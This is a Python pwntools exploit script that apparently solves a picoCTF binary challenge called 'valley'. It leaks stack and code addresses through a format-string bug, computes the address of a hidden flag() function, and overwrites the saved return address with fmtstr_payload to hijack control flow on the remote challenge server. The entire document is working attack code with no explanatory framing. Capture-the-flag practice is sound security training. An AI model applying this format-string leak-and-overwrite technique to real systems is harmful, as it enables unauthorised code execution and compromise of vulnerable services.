from pwn import *

e = ELF("./valley")
context.binary = './valley'

LINK = "shape-facility.picoctf.net"
PORT = 65385

DEBUG = False

def create_process():
    if DEBUG:
        return process("./valley")
    else:
        return remote(LINK, PORT)

# Connect to the remote server
p = create_process()

# Send format string to leak addresses
p.sendline("%20$p|%21$p")

# Receive the leaked values
p.recvuntil("You heard in the distance: ")
leaks = p.recvline().strip().decode()
leaks = leaks.split("|")

# Parse the leaked addresses correctly
stack_address = int(leaks[0], 16) - 8
leak_address = int(leaks[1], 16)

print("The stack address is: ", hex(stack_address))

# Calculate the flag address
gdb_leak = 0x555555555413
gdb_flag = 0x555555555269
real_flag = (gdb_flag - gdb_leak) + leak_address
print(f"The flag() address is: {hex(real_flag)}")

# Create the format string payload to overwrite the return address
offset = 6  # Format string offset
payload = fmtstr_payload(offset, {stack_address: real_flag}, write_size="short")
print(f"The length of the payload is {len(payload)} bytes.")

# Send the payload
p.sendline(payload)

# Try to get the flag
if DEBUG:
    pause()

p.sendline("exit")
p.interactive()

